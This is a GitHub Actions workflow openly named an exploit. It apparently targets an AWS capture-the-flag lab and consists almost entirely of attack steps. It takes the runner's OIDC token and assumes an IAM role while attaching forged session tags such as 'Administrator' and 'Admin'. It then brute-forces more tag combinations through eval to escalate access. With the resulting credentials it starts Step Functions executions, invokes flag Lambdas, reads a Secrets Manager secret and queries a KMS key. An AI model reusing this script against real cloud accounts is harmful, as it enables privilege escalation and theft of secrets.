name: Step Functions Session Tags Exploit

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  stepfunctions-exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Manual OIDC role assumption with session tags
        run: |
          echo "=== Manual OIDC Role Assumption with Session Tags ==="
          
          # Get GitHub Actions OIDC token
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
          
          echo "OIDC token obtained"
          
          # Assume role with session tags focused on Step Functions access
          aws sts assume-role-with-web-identity \
            --role-arn arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role \
            --role-session-name stepfunctions-session-tags \
            --web-identity-token "$OIDC_TOKEN" \
            --tags Key=Department,Value=Admin Key=Role,Value=Administrator Key=Service,Value=stepfunctions Key=Action,Value=StartExecution Key=Resource,Value=stateMachine Key=Flag,Value=true Key=Execute,Value=allowed Key=github,Value=actions Key=lab,Value=whitebox-2 \
            --duration-seconds 3600 > /tmp/credentials.json
          
          # Extract and export credentials
          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' /tmp/credentials.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' /tmp/credentials.json)
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' /tmp/credentials.json)
          
          echo "Current identity with session tags:"
          aws sts get-caller-identity
          
          echo "=== Testing Step Functions Access with Session Tags ==="
          
          # Test Step Functions operations
          echo "Listing state machines:"
          aws stepfunctions list-state-machines || echo "List state machines failed"
          
          echo "Describing our target state machine:"
          aws stepfunctions describe-state-machine --state-machine-arn arn:aws:states:us-east-1:067186171322:stateMachine:whitebox-lab-2-flag-machine || echo "Describe state machine failed"
          
          echo "Attempting to start execution with session tags:"
          aws stepfunctions start-execution \
            --state-machine-arn arn:aws:states:us-east-1:067186171322:stateMachine:whitebox-lab-2-flag-machine \
            --name "github-actions-exploit-$(date +%s)" \
            --input '{"source":"github-actions","tags":"session-based"}' && echo "✅ SUCCESS: Step Functions execution started!" || echo "❌ Step Functions execution failed"
          
          # If execution started, check status
          echo "Listing recent executions:"
          aws stepfunctions list-executions --state-machine-arn arn:aws:states:us-east-1:067186171322:stateMachine:whitebox-lab-2-flag-machine --max-items 5 || echo "List executions failed"

      - name: Test additional session tag combinations for Step Functions
        run: |
          echo "=== Testing Additional Session Tag Combinations ==="
          
          # Try different tag combinations that might unlock Step Functions access
          declare -a tag_combinations=(
            "Key=states,Value=StartExecution Key=stepfunctions,Value=admin Key=execution,Value=allowed"
            "Key=PrincipalTag:Role,Value=Admin Key=PrincipalTag:Department,Value=Security"
            "Key=ResourceTag:Environment,Value=production Key=ResourceTag:Service,Value=stepfunctions"
            "Key=aws:RequestedRegion,Value=us-east-1 Key=aws:userid,Value=github-actions"
          )
          
          for tags in "${tag_combinations[@]}"; do
            echo "Testing tag combination: $tags"
            
            # Get fresh OIDC token
            OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
            
            # Create the tags parameter dynamically
            TAG_PARAMS=""
            IFS=' ' read -ra TAG_ARRAY <<< "$tags"
            for tag in "${TAG_ARRAY[@]}"; do
              TAG_PARAMS="$TAG_PARAMS --tags $tag"
            done
            
            # Try to assume role with this tag combination
            eval "aws sts assume-role-with-web-identity \
              --role-arn arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role \
              --role-session-name test-session-$(date +%s) \
              --web-identity-token '$OIDC_TOKEN' \
              $TAG_PARAMS \
              --duration-seconds 900" > /tmp/test_creds.json 2>/dev/null
            
            if [ $? -eq 0 ]; then
              echo "Role assumption successful with tags: $tags"
              
              # Extract credentials
              TEST_ACCESS_KEY=$(jq -r '.Credentials.AccessKeyId' /tmp/test_creds.json)
              TEST_SECRET_KEY=$(jq -r '.Credentials.SecretAccessKey' /tmp/test_creds.json)
              TEST_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' /tmp/test_creds.json)
              
              # Test Step Functions access with these credentials
              AWS_ACCESS_KEY_ID="$TEST_ACCESS_KEY" AWS_SECRET_ACCESS_KEY="$TEST_SECRET_KEY" AWS_SESSION_TOKEN="$TEST_SESSION_TOKEN" \
                aws stepfunctions start-execution \
                --state-machine-arn arn:aws:states:us-east-1:067186171322:stateMachine:whitebox-lab-2-flag-machine \
                --name "test-execution-$(date +%s)" \
                --input '{"test":"session-tags"}' && echo "✅ SUCCESS with tags: $tags" || echo "❌ Failed with tags: $tags"
            else
              echo "Role assumption failed with tags: $tags"
            fi
            
            echo "---"
          done

      - name: Test other AWS services with session tags
        run: |
          echo "=== Testing Other Services with Session Tags ==="
          
          # Use the credentials from the first successful assumption
          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' /tmp/credentials.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' /tmp/credentials.json)
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' /tmp/credentials.json)
          
          echo "Testing Lambda invocation with session tags:"
          aws lambda invoke --function-name whiteboxLab2FlagFunction /tmp/lambda1.json && echo "✅ Lambda 1 successful" || echo "❌ Lambda 1 failed"
          aws lambda invoke --function-name whiteboxLab2LambdaFlagCode /tmp/lambda2.json && echo "✅ Lambda 2 successful" || echo "❌ Lambda 2 failed"
          
          echo "Lambda outputs:"
          cat /tmp/lambda1.json 2>/dev/null && echo ""
          cat /tmp/lambda2.json 2>/dev/null && echo ""
          
          echo "Testing Secrets Manager with session tags:"
          aws secretsmanager get-secret-value --secret-id flag_whitebox_lab_2_2 && echo "✅ Secret access successful" || echo "❌ Secret access failed"
          
          echo "Testing KMS operations with session tags:"
          aws kms describe-key --key-id 61e032f9-f8ae-4ddd-9d15-9b8e4896b78f && echo "✅ KMS access successful" || echo "❌ KMS access failed"
          
          echo "=== Session Tags Exploitation Complete ==="
